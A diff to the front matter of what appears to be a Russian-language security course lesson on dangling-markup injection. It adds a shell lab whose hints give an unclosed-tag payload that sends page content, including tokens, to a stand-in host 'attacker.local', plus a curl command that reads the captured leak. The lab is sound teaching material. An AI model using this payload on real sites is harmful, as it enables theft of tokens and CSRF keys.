@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как незакрытым HTML-тегом украсть содержимое страницы (токены, CSRF-ключи) без единой строки JS."
+lab:
+  kind: shell
+  title: "Практика: dangling markup — эксфильтрация без JS"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - 'Комментарии не экранируются.'
+    - 'Оставь незакрытый тег: "><img src="//attacker.local/?leak='
+    - 'Браузер поглотит следующий HTML (с токеном) в URL запроса.'
+    - 'Прочитай лог слушателя: curl -s http://attacker.local/log > found.txt.'
 ---
 
 ## Вопрос, с которого всё начинается
